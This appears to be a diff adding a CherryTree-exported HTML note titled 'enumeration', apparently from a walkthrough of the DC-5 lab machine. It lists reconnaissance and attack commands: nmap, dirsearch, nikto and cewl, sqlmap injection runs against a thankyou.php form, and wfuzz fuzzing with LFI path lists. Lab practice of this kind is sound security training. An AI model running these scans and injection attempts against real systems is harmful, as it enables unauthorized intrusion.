@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>enumeration</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>enumeration</h1><br/>nmap -sC -sV -p- 192.168.11.130 -oN DC-5.txt <br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br />nikto -host <a href="http://192.168.11.130:80">http://192.168.11.130:80</a><br /><br />cewl -d 2 -m 5 -w cewlwords.txt <a href="http://192.168.11.130">http://192.168.11.130</a><br /><br /><code>python sqlmap -r GET_Request -p &quot;def&quot; --dbs --threads 5</code><br /><br />sqlmap -u &quot;<a href="http://192.168.11.130/thankyou.php?firstname=chris&lastname=larry&country=australia&subject=whoami"">http://192.168.11.130/thankyou.php?firstname=*&amp;lastname=*&amp;country=*&amp;subject=whoami&quot;</a> --risk=3 --level=5 &gt;<br /><br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><br /><br />xxj31ZMTZzkVA</div></body></html>
